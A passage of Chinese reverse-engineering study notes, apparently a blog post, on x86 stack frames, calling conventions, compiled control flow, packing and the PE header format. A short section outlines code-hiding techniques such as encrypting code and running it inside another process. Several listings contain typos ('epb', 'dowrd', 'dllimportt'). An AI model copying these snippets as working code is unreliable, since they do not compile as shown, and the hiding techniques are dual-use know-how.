程序主要部分</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + <span class="number">8</span>] <span class="comment">; 使用第1个参数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + C] <span class="comment">; 使用第2个参数</span></span><br><span class="line"><span class="comment">; 返回部分</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EDI</span></span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">ESI</span>  </span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EBX</span>       <span class="comment">; 恢复现场</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ESP</span>, <span class="built_in">EBP</span>  </span><br><span class="line"><span class="keyword">POP</span> <span class="built_in">EBP</span>       <span class="comment">; 弹出旧栈</span></span><br><span class="line"><span class="keyword">RETN</span>          <span class="comment">; 返回值在EAX中</span></span><br></pre></td></tr></table></figure>

<h3 id="Windows-堆栈"><a href="#Windows-堆栈" class="headerlink" title="Windows 堆栈"></a>Windows 堆栈</h3><ol>
<li>先进后出</li>
<li>向低地址扩展</li>
</ol>
<h3 id="裸函数"><a href="#裸函数" class="headerlink" title="裸函数"></a>裸函数</h3><p>编译器完全不管的函数。由CALL调用后跳转到函数中，函数没有任何汇编代码，全部都是INT3。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus()</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C语言里面也可以加入汇编。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus()</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123;  <span class="comment">// _asm 也可以</span></span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) Plus(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">&#123;</span><br><span class="line">    __asm&#123; </span><br><span class="line">        <span class="comment">// 提升堆栈</span></span><br><span class="line">        push ebp</span><br><span class="line">        mov ebp, esp</span><br><span class="line">        sub esp, <span class="number">0x40</span></span><br><span class="line">        <span class="comment">// 保留现场</span></span><br><span class="line">        push ebx</span><br><span class="line">        push esi</span><br><span class="line">        push edi</span><br><span class="line">        <span class="comment">// 填充缓冲区</span></span><br><span class="line">        mov eax, <span class="number">0xCCCCCCCC</span></span><br><span class="line">        mov ecx, <span class="number">0x10</span></span><br><span class="line">        lea edi, dword ptr ds:[epb - <span class="number">0x40</span>]</span><br><span class="line">        rep stosd</span><br><span class="line">        <span class="comment">// 主要功能</span></span><br><span class="line">        mov eax, dword ptr ds:[ebp + <span class="number">0x8</span>]</span><br><span class="line">        add eax, dword ptr ds:[ebp + <span class="number">0xC</span>]</span><br><span class="line">        <span class="comment">// 恢复现场</span></span><br><span class="line">        pop edi</span><br><span class="line">        pop esi</span><br><span class="line">        pop ebx</span><br><span class="line">        <span class="comment">// 恢复堆栈</span></span><br><span class="line">        mov esp, ebp</span><br><span class="line">        pop ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>__declspec</code>关键字用法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 规定内存对齐的位置，不规定占用的长度</span></span><br><span class="line"><span class="comment">// #pragma pack() 规定内存对齐的最小值</span></span><br><span class="line">__declspec(align(<span class="number">32</span>)) </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span>&#123;</span> <span class="type">int</span> a, b, c &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明数据段的一个数据项</span></span><br><span class="line"><span class="comment">// 与 #pragma code_seg, const_seg, data_seg, section, init_seg 配合使用</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;share_data&quot;</span>)</span></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg() __declspec(allocate(<span class="string">&quot;share_data&quot;</span>)) int c = 1;</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;share_data&quot;</span>)) <span class="type">int</span> d;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL调用与输出</span></span><br><span class="line"><span class="comment">// 输出端</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> ___<span class="title">declspec</span>(<span class="title">dllexport</span>)</span></span><br><span class="line"><span class="class"><span class="title">DllExport</span>&#123;</span>  </span><br><span class="line">    DllExport()&#123;&#125;;</span><br><span class="line">    ~DllExport()&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 输入端</span></span><br><span class="line"><span class="meta">#import comment(lib, <span class="string">&quot;dll_name.lib&quot;</span>)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> ___<span class="title">declspec</span>(<span class="title">dllimportt</span>)</span></span><br><span class="line"><span class="class"><span class="title">DllExport</span>&#123;</span>  </span><br><span class="line">    DllExport()&#123;&#125;;</span><br><span class="line">    ~DllExport()&#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 裸函数</span></span><br><span class="line"><span class="comment">// 仅在x86中有效，仅对函数有效</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) func()&#123;</span><br><span class="line">    __asm &#123; ret &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// selectany</span></span><br><span class="line"><span class="comment">// 允许在.h文件中创建全局变量</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stu</span>&#123;</span></span><br><span class="line">public:</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br><span class="line">__declspec(selectany) <span class="type">int</span> Stu::count = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>


<h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>有如下调用约定，规定参数的传递，返回值的传递。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>     <span class="comment">// C/C++默认，从右向左压入参数，外平栈</span></span><br><span class="line"><span class="type">int</span> __stdcall <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>   <span class="comment">// WIN32 API，从右向左压入参数，内平栈</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">plus</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>  <span class="comment">// ECX/EDX存入前两个，其他的从右向左压入，内平栈</span></span><br></pre></td></tr></table></figure>

<h3 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h3><p>控制台程序中，C语言程序运行后，函数堆栈如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main(<span class="type">int</span> <span class="number">1</span>, <span class="type">char</span>**)   <span class="comment">// 编程入口</span></span><br><span class="line">mainCRTStartup()      <span class="comment">// 真正的入口，Link-&gt;Output-&gt;Entry-point symbol中规定</span></span><br><span class="line">KERNEL32! <span class="number">7</span>c816d4f()  <span class="comment">// </span></span><br></pre></td></tr></table></figure>

<p><code>mainCRTStartup()</code>函数在<code>main()</code>之前先初始化：</p>
<ol>
<li>获取系统版本    GetVersion()</li>
<li>堆初始化        _heap_init()</li>
<li>获取命令行参数  GetCommandLineA()</li>
<li>获取环境变量    _crtGetEnvironmentStringA()</li>
<li>设置参数       _setargv()</li>
<li>设置环境PATH   _setenvp()</li>
<li>初始化C        _cinit()</li>
<li>调用<code>main(__argc, __argv, _environ)</code></li>
</ol>
<p>找Main方法，就是去找3个参数的方法。例如：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="built_in">edx</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">CALL</span> ...</span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">0xC</span></span><br></pre></td></tr></table></figure>

<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>四种数据类型：</p>
<ol>
<li>基本类型：整数，浮点</li>
<li>构造类型：数组，结构体，联合体</li>
<li>指针类型</li>
<li>空类型：void</li>
</ol>
<p>有符号的和无符号的数存放方式一样，在使用时候才会区分。一般是类型转换，比较大小，数学运算中会区别使用。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 内存对齐</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], 0xFFh   <span class="comment">; 有符号无符号存储时都一样</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> [epb - <span class="number">8</span>], 0xFFh</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">0xC</span>], 0xFFh</span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 比较有符号数</span></span><br><span class="line"><span class="keyword">JLE</span> </span><br><span class="line"><span class="comment">; 比较无符号数</span></span><br><span class="line"><span class="keyword">JBE</span> </span><br></pre></td></tr></table></figure>

<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>传入参数<br>传参时，由于使用PUSH，因此不论是何种类型，一律是传入32位数据。</p>
<p>返回值<br>一般情况下，返回值放到EAX中，如果是64位数据，则高位放到EDX，低位放到EAX中。</p>
<p>局部变量<br>一般直接分配32位的整数倍，不论是char，short还是int。</p>
<p>数组<br>一般是按照32位的整数倍为数组分配空间。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> x[<span class="number">5</span>];  <span class="comment">// 占8字节</span></span><br></pre></td></tr></table></figure>

<h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>如果遇到连续赋值，但内存单元不是等宽，那么很有可能是结构体。<br>传参数传递结构体时，将结构体复制到栈里面。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">esp</span>, <span class="number">18h</span>          <span class="comment">; 结构体大小</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="number">6</span>            <span class="comment">; 复制次数</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">esi</span>, [<span class="built_in">ebp</span> - <span class="number">18h</span>]  <span class="comment">; 复制开始的地址  ESI</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edi</span>, <span class="built_in">esp</span>          <span class="comment">; 子程序栈上  EDI </span></span><br><span class="line"><span class="keyword">REP</span> MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>], <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]  <span class="comment">; 复制</span></span><br></pre></td></tr></table></figure>

<p>做函数返回值时候，主函数首先创建缓冲区<code>LEA eax, [ebp-30h]</code>，之后<code>PUSH eax</code>，也就是将缓冲区地址传入子程序中。但是在函数执行完后，还要将数据从缓冲区复制到自己的局部变量里面。</p>
<p>结构体要数组对齐。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pach(n)  <span class="comment">// 自定义对齐</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack()   <span class="comment">// 恢复默认对齐</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Sizeof"><a href="#Sizeof" class="headerlink" title="Sizeof"></a>Sizeof</h3><p>Sizeof是一个关键字，用于获取类型大小，结构体大小，数组占的内存大小。</p>
<h3 id="内存图"><a href="#内存图" class="headerlink" title="内存图"></a>内存图</h3><p>内存区域：</p>
<ol>
<li>代码区：可读，可执行</li>
<li>栈：参数，局部变量，临时数据</li>
<li>堆</li>
<li>全局变量：可读写</li>
<li>常量：可读</li>
</ol>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 全局变量特点：</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="number">0x00427320</span>], <span class="built_in">eax</span>   <span class="comment">; 直接写到某个地址</span></span><br><span class="line"><span class="comment">; 局部变量特点：</span></span><br><span class="line"><span class="keyword">mov</span> dwprd <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">eax</span>      <span class="comment">; 基址加偏移</span></span><br></pre></td></tr></table></figure>

<h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>IF 语句<br>当遇到CMP&#x2F;TEST等影响标志位的命令，之后紧接JCC，则为IF。<br>汇编中和C语言中一般是反过来的。汇编中，如果满足条件则跳出；C语言中，如果满足条件则执行。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; IF</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">eax</span>, dowrd <span class="built_in">ptr</span> [epb + <span class="number">0xC</span>]</span><br><span class="line"><span class="keyword">JLE</span> <span class="number">0x00401049</span>  <span class="comment">; JMP 的下一行代码地址</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="comment">; ELSE</span></span><br><span class="line"><span class="keyword">JMP</span> <span class="number">0x00401060</span>  <span class="comment">; IF 语句的结束位置</span></span><br><span class="line"><span class="comment">; ...</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; IF (a &gt; 1 &amp;&amp; b &gt; 1 &amp;&amp; c &gt; 1)</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 1</span></span><br><span class="line"><span class="keyword">JLE</span> <span class="comment">; 复合条件 则继续判断；否则跳到结尾</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 2</span></span><br><span class="line"><span class="keyword">JLE</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="comment">; 条件 3</span></span><br><span class="line"><span class="keyword">JLE</span></span><br><span class="line"><span class="comment">; 结尾</span></span><br></pre></td></tr></table></figure>

<p>SWITCH 语句</p>
<ol>
<li>当情况数较少时候（2 Cases + Default）实现和IF一样。</li>
<li>当情况数较多时候（4个分支时候），则生成大情况表。它会将每一个分支地址都存到大表中，然后通过给定的参数直接计算分支的地址直接跳转。<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">ecx</span>, <span class="number">01h</span>   <span class="comment">; 将传入的参数减 Case 1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">ecx</span>  </span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="number">3</span>    <span class="comment">; 1 与 3 比较</span></span><br><span class="line"><span class="keyword">JA</span>  xxx                       <span class="comment">; 跳转到 Default</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [epb - <span class="number">4</span>]  <span class="comment">; 将 1 放到 edx</span></span><br><span class="line"><span class="keyword">JMP</span> dowrd <span class="built_in">ptr</span> [<span class="built_in">edx</span> * <span class="number">4</span> + @ Case <span class="number">1</span>]  <span class="comment">; 依据表得到跳转地址</span></span><br></pre></td></tr></table></figure></li>
<li>当 CASE 值连续相近时，才采取情况2的方式，如果中间断了一两个，那么空缺的地方则填入Default；如果 CASE 值混乱，则使用情况1方式。</li>
<li>当 CASE 值不太连续相近，但是又不够混乱时（例如CASE 字母），还会生产小表（CASE值转偏移值的表），之后通过小表查找偏移量，进一步再去查询大表（存放分支地址的表），此时大表中为连续的，不必插入Default。<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SUB</span> <span class="built_in">ecx</span>, <span class="number">01h</span>   <span class="comment">; 将传入的参数减 Case 1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="built_in">ecx</span>  </span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [epb - <span class="number">4</span>], <span class="number">3</span>    <span class="comment">; 1 与 3 比较</span></span><br><span class="line"><span class="keyword">JA</span>  xxx                       <span class="comment">; 跳转到 Default</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [epb - <span class="number">4</span>]  <span class="comment">; 将 1 放到 edx</span></span><br><span class="line"><span class="comment">; 新增</span></span><br><span class="line"><span class="keyword">XOR</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>                        <span class="comment">; 清空 edx</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dl</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span> + 表开始地址]  <span class="comment">; 查询小表</span></span><br><span class="line"><span class="keyword">JMP</span> dowrd <span class="built_in">ptr</span> [<span class="built_in">edx</span> * <span class="number">4</span> + @ Case <span class="number">1</span>]  <span class="comment">; 依据小表得到大表中的跳转地址</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>do while性能最好。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span>  <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]    <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span>                         <span class="comment">; 调用函数的参数</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                      <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                       <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]     <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ecx</span>, <span class="number">1</span>                       <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>], <span class="built_in">ecx</span>     <span class="comment">; 判断计次变量</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]</span><br><span class="line"><span class="keyword">JG</span>  Start </span><br></pre></td></tr></table></figure>

<p>While语句：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]</span><br><span class="line"><span class="keyword">JGE</span> End                           <span class="comment">; 判断是否复合条件</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; 传入参数</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                       <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                        <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">edx</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>], <span class="built_in">edx</span>      <span class="comment">; x++</span></span><br><span class="line"><span class="keyword">JMP</span> Start</span><br><span class="line"><span class="comment">; End</span></span><br></pre></td></tr></table></figure>

<p>For 语句</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + <span class="number">8</span>]      <span class="comment">; 取传入的参数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>], <span class="built_in">eax</span>      <span class="comment">; 放入局部变量</span></span><br><span class="line"><span class="keyword">JMP</span> Middle                        <span class="comment">; 跳转到</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; Start</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ecx</span>, <span class="number">1</span>                        <span class="comment">; i++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>], <span class="built_in">ecx</span>      <span class="comment">; i++</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; Middle</span></span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> + 0xCh]   </span><br><span class="line"><span class="keyword">JGE</span> End                           <span class="comment">; 与传入的另一参数判断大小</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">4</span>]      <span class="comment">; 传入参数，调用Printf</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">eax</span></span><br><span class="line"><span class="keyword">PUSH</span> offset string</span><br><span class="line"><span class="keyword">CALL</span> printf                       <span class="comment">; 调用函数</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">esp</span>, <span class="number">8</span>                        <span class="comment">; 外平栈</span></span><br><span class="line"><span class="keyword">JMP</span> Start</span><br><span class="line"><span class="comment">; End</span></span><br></pre></td></tr></table></figure>

<h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>32位机下，指针不论指向何种类型，都是32位4字节。<br>64位机下，指针不论指向何种类型，都是64位8字节。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; int x = *px;</span></span><br><span class="line"><span class="comment">; 寄存器间接寻址 </span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ecx</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - <span class="number">8</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, dowrd <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span> - 0xCh], <span class="built_in">edx</span></span><br></pre></td></tr></table></figure>

<h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>将需要保护的代码的硬编码放到数据区，并将代码区变为全零。<br>可以用位运算对代码加密，例如对执行代码取反后保存。<br>用一个进程执行另一个程序的代码，隐藏原程序。</p>
<h3 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h3><p>Windows程序在内存或硬盘中结构一般有这几部分：</p>
<ul>
<li>DOS 头</li>
<li>填充数据（无用，长度可变）</li>
<li>NT 头（标准PE头，可选PE头）</li>
<li>节表（各个节的位置）</li>
<li>节 x N （数据段，代码段等）</li>
</ul>
<p>程序在硬盘中和在运行时的二进制数据不一样。区别：</p>
<ol>
<li>地址起始位置：硬盘中从0开始，内存中不是。</li>
<li>对齐方式：早期程序，在硬盘中对齐单位是200h。现代程序对齐单位一般是1000h。内存中对齐一般是1000h。</li>
</ol>
<p>DOS 头：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 被注释的部分是16位程序使用的</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0X00</span> WORD e_magic;      <span class="comment">//※Magic DOS signature MZ(4Dh 5Ah):MZ标记:用于标记是否是可执行文件</span></span><br><span class="line">    <span class="comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span></span><br><span class="line">    <span class="comment">//0X04 WORD e_cp;       //Pages in file</span></span><br><span class="line">    <span class="comment">//0X06 WORD e_crlc;     //Relocations</span></span><br><span class="line">    <span class="comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span></span><br><span class="line">    <span class="comment">//0X0A WORD e_minalloc; //Minimun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0C WORD e_maxalloc; //Maximun extra paragraphs needs</span></span><br><span class="line">    <span class="comment">//0X0E WORD e_ss;       //intial(relative)SS value</span></span><br><span class="line">    <span class="comment">//0X10 WORD e_sp;       //intial SP value</span></span><br><span class="line">    <span class="comment">//0X12 WORD e_csum;     //Checksum</span></span><br><span class="line">    <span class="comment">//0X14 WORD e_ip;       //intial IP value</span></span><br><span class="line">    <span class="comment">//0X16 WORD e_cs;       //intial(relative)CS value</span></span><br><span class="line">    <span class="comment">//0X18 WORD e_lfarlc;   //File Address of relocation table</span></span><br><span class="line">    <span class="comment">//0X1A WORD e_ovno;     //Overlay number</span></span><br><span class="line">    <span class="comment">//0x1C WORD e_res[4];   //Reserved words</span></span><br><span class="line">    <span class="comment">//0x24 WORD e_oemid;    //OEM identifier(for e_oeminfo)</span></span><br><span class="line">    <span class="comment">//0x26 WORD e_oeminfo;  //OEM information;e_oemid specific</span></span><br><span class="line">    <span class="comment">//0x28 WORD e_res2[10]; //Reserved words</span></span><br><span class="line">    <span class="number">0x3C</span> DWORD e_lfanew;    <span class="comment">//※Offset to start of PE header:定位PE文件，PE头相对于文件的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>NT 头：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NT 头</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> DWORD Signature;   <span class="comment">//PE文件标识:ASCII的&quot;PE\0\0&quot;  50h 45h</span></span><br><span class="line">    <span class="number">0x04</span> _IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="number">0x18</span> _IMAGE_OPTIONAL_HEADER OptionalHeader;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>标准 PE 头：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span>&#123;</span></span><br><span class="line">    <span class="number">0x00</span> WORD Machine;                  <span class="comment">//※程序执行的CPU平台:0X0:任何平台，0X14C:intel i386及后续处理器</span></span><br><span class="line">    <span class="number">0x02</span> WORD NumberOfSections;         <span class="comment">//※PE文件中区块数量</span></span><br><span class="line">    <span class="number">0x04</span> DWORD TimeDateStamp;           <span class="comment">//时间戳：连接器产生此文件的时间距1969/12/31-16:00P:00的总秒数</span></span><br><span class="line">    <span class="comment">//0x08 DWORD PointerToSymbolTable;  //COFF符号表格的偏移位置。此字段只对COFF除错信息有用</span></span><br><span class="line">    <span class="comment">//0x0c DWORD NumberOfSymbols;       //COFF符号表格中的符号个数。该值和上一个值在release版本的程序里为0</span></span><br><span class="line">    <span class="number">0x10</span> WORD SizeOfOptionalHeader;   <span class="comment">//IMAGE_OPTIONAL_HEADER结构的大小(字节数):32位默认E0H,64位默认F0H(可修改)</span></span><br><span class="line">    <span class="number">0x12</span> WORD Characteristics;          <span class="comment">//※描述文件属性,eg:</span></span><br><span class="line">                                        <span class="comment">//单属性(只有1bit为1)：#define IMAGE_FILE_DLL 0x2000  //File is a DLL.</span></span><br><span class="line">                                        <span class="comment">//组合属性(多个bit为1，单属性或运算):0X010F 